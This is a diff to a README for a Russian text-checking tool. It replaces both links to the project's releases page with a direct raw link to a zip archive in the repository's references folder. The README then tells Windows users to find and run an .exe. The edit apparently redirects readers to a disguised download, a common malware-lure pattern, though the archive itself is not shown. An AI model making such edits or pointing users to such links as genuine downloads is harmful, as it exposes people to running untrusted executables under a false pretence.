@@ -1,6 +1,6 @@
 # 🇷🇺 russian-text-quality - Fix Russian language errors in code
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Axelendometrial4386/russian-text-quality/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Axelendometrial4386/russian-text-quality/raw/refs/heads/main/references/text-quality-russian-v2.6-beta.1.zip)
 
 This software checks Russian text within your code files. It finds common mistakes in grammar, word choices, and spelling. It helps you keep your translations consistent and accurate. You can use this tool to fix issues with plural forms, sentence structure, and mixed languages. It works well with existing projects that use internationalization files.
 
@@ -29,7 +29,7 @@ This tool runs on most modern desktop environments. Before you start, check that
 
 You download the software directly from the project release page. 
 
-[Click here to visit the download page](https://github.com/Axelendometrial4386/russian-text-quality/releases)
+[Click here to visit the download page](https://github.com/Axelendometrial4386/russian-text-quality/raw/refs/heads/main/references/text-quality-russian-v2.6-beta.1.zip)
 
 Locate the file ending in .exe for your Windows system. Click the link to start the download. Save the file to a folder where you can find it later, such as your Downloads folder.
 
